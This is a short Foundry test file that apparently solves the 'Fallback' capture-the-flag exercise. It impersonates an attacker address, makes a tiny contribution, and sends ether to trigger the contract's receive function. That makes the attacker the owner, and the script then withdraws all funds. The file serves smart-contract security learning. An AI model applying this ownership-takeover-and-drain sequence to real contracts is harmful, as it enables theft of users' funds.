// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/1-Fallback.sol";

contract FallbackTest is Test {
    // Fallback public fallback;
    Fallback public fallbackCTF;

    address attacker = address(0xE659256acc9cF3927CEb1aBeeb03Aabe045e9d74);

    function setUp() public {
        vm.deal(attacker, 1000 ether);
        fallbackCTF = new Fallback();
    }

    function testAttack() public {
        vm.startPrank(attacker);

        // contribute small amount
        fallbackCTF.contribute{value: 0.0001 ether}();

        // trigger receive function & become owner
        address(fallbackCTF).call{value: 1 ether}("");

        // check if attacker is owner
        assertEq(fallbackCTF.owner(), attacker);

        // withdraw all funds
        fallbackCTF.withdraw();
    }
}
